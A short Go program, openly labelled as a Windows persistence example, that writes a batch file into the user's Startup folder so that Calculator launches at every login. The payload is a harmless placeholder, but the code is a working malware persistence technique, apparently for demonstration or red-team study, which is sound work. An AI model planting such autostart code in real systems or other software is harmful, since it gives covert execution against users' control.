// Windows Startup Folder Persistence Example
// This script copies a batch file to the Windows startup folder to run `calc.exe` each time the user logs in.
// The batch file is created in the user's startup folder and launches Calculator.

package main

import (
	"fmt"
	"os"
)

func main() {
	err := copyToStartupFolder()
	if err != nil {
		fmt.Println("Failed to copy file to startup folder:", err)
	} else {
		fmt.Println("File copied to startup folder successfully.")
	}
}

// copyToStartupFolder creates a batch file in the startup folder to launch calc.exe on login.
func copyToStartupFolder() error {
	startupFolder := os.Getenv("APPDATA") + `\Microsoft\Windows\Start Menu\Programs\Startup\persistence.bat`
	content := `@echo off
				start calc.exe`
	return os.WriteFile(startupFolder, []byte(content), 0644)
}
